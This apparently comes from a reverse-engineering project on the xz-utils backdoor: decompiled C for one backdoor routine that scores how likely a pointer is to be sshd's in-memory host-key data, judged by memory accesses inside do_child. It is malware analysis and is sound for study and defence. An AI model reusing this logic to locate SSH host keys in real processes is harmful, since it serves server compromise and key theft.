// /home/kali/xzre-ghidra/xzregh/103870_sshd_get_sensitive_data_score_in_do_child.c
// Function: sshd_get_sensitive_data_score_in_do_child @ 0x103870
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_get_sensitive_data_score_in_do_child(void * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Counts characteristic memory accesses to the candidate `sensitive_data` pointer inside `do_child` and produces a confidence score. The aggregate scorer uses this value to decide whether the pointer is safe to treat as the real host-key cache.
 */
#include "xzre_types.h"


int sshd_get_sensitive_data_score_in_do_child
              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  u8 *code_start;
  u8 *code_end;
  BOOL BVar1;
  long lVar2;
  dasm_ctx_t *pdVar3;
  uint uVar4;
  byte bVar5;
  dasm_ctx_t local_80;
  
  bVar5 = 0;
  uVar4 = 0;
  code_start = (u8 *)refs->entries[1].func_start;
  if (code_start != (u8 *)0x0) {
    code_end = (u8 *)refs->entries[1].func_end;
    BVar1 = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
    uVar4 = (uint)(BVar1 != 0);
    pdVar3 = &local_80;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)&pdVar3->instruction = 0;
      pdVar3 = (dasm_ctx_t *)((long)pdVar3 + (ulong)bVar5 * -8 + 4);
    }
    BVar1 = find_instruction_with_mem_operand
                      (code_start,code_end,&local_80,(void *)((long)sensitive_data + 0x10));
    if (BVar1 != 0) {
      BVar1 = find_instruction_with_mem_operand
                        (local_80.instruction + local_80.instruction_size,code_end,(dasm_ctx_t *)0x0
                         ,(void *)((long)sensitive_data + 0x10));
      if (BVar1 == 0) {
        uVar4 = uVar4 + 1;
      }
      else {
        uVar4 = uVar4 + 2;
      }
    }
  }
  return uVar4;
}

